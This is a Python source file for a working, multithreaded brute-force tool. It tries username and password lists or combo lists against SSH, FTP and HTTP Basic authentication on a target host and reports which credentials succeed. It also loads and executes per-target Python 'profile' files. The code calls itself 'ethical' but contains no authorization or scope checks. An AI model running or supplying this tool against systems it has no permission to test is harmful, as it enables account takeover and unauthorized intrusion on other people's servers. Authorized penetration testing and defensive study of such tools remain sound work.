import argparse
import threading
import time
from queue import Queue
import importlib.util
import os
import requests
import paramiko
import ftplib

print_lock = threading.Lock()

def load_profile(target):
    profile_name = target.replace('.', '_')
    profile_path = os.path.join('profiles', f'{profile_name}.py')
    default_path = os.path.join('profiles', 'default.py')

    if os.path.isfile(profile_path):
        spec = importlib.util.spec_from_file_location('profile', profile_path)
    elif os.path.isfile(default_path):
        spec = importlib.util.spec_from_file_location('profile', default_path)
    else:
        return None

    profile = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(profile)
    return profile

def ssh_brute(ip, username, password, timeout):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password, timeout=timeout)
        client.close()
        with print_lock:
            print(f"[SUCCESS][SSH] {username}:{password}@{ip}")
        return True
    except Exception as e:
        with print_lock:
            print(f"[FAIL][SSH] {username}:{password}@{ip} ({str(e)})")
        return False

def ftp_brute(ip, username, password, timeout):
    try:
        ftp = ftplib.FTP()
        ftp.connect(ip, timeout=timeout)
        ftp.login(username, password)
        ftp.quit()
        with print_lock:
            print(f"[SUCCESS][FTP] {username}:{password}@{ip}")
        return True
    except Exception as e:
        with print_lock:
            print(f"[FAIL][FTP] {username}:{password}@{ip} ({str(e)})")
        return False

def http_basic_brute(ip, username, password, timeout, path, headers=None):
    headers = headers or {}
    try:
        url = f"http://{ip}{path}"
        r = requests.get(url, auth=(username, password), timeout=timeout, headers=headers)
        if r.status_code == 200:
            with print_lock:
                print(f"[SUCCESS][HTTP] {username}:{password}@{ip}{path}")
            return True
        else:
            with print_lock:
                print(f"[FAIL][HTTP] {username}:{password}@{ip}{path} (Status {r.status_code})")
            return False
    except Exception as e:
        with print_lock:
            print(f"[ERROR][HTTP] {username}:{password}@{ip}{path} ({str(e)})")
        return False

def worker(q, protocol, profile):
    timeout = profile.get_timeout() if profile and hasattr(profile, 'get_timeout') else 5
    backoff = profile.get_backoff() if profile and hasattr(profile, 'get_backoff') else 0
    http_path = profile.get_http_auth_url('') if profile and hasattr(profile, 'get_http_auth_url') else '/'
    headers = profile.get_headers() if profile and hasattr(profile, 'get_headers') else {}

    while True:
        try:
            user, pwd, target = q.get(timeout=1)
        except:
            break  # Queue empty

        if protocol == 'ssh':
            ssh_brute(target, user, pwd, timeout)
        elif protocol == 'ftp':
            ftp_brute(target, user, pwd, timeout)
        elif protocol == 'http':
            http_basic_brute(target, user, pwd, timeout, http_path, headers)
        else:
            with print_lock:
                print(f"[ERROR] Unknown protocol: {protocol}")

        time.sleep(backoff)
        q.task_done()

def main():
    parser = argparse.ArgumentParser(description='Ethical Brute Force Tool with Profiles and Combo Mode')
    parser.add_argument('protocol', choices=['ssh', 'ftp', 'http'], help='Protocol to brute force')
    parser.add_argument('target', help='Target IP or hostname')
    parser.add_argument('-U', '--userfile', help='File with usernames')
    parser.add_argument('-P', '--passfile', help='File with passwords')
    parser.add_argument('--combo-file', help='File with username:password combos')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    args = parser.parse_args()

    profile = load_profile(args.target)

    q = Queue()

    if args.combo_file:
        with open(args.combo_file, 'r') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    user, pwd = line.split(':', 1)
                    q.put((user, pwd, args.target))
    else:
        if not args.userfile or not args.passfile:
            print("Error: Must provide --userfile and --passfile if no --combo-file specified.")
            exit(1)
        with open(args.userfile, 'r') as f:
            users = [line.strip() for line in f if line.strip()]
        with open(args.passfile, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
        for user in users:
            for pwd in passwords:
                q.put((user, pwd, args.target))

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(q, args.protocol, profile))
        t.daemon = True
        t.start()
        threads.append(t)

    q.join()
    print("Brute force attempts completed.")

if __name__ == "__main__":
    main()
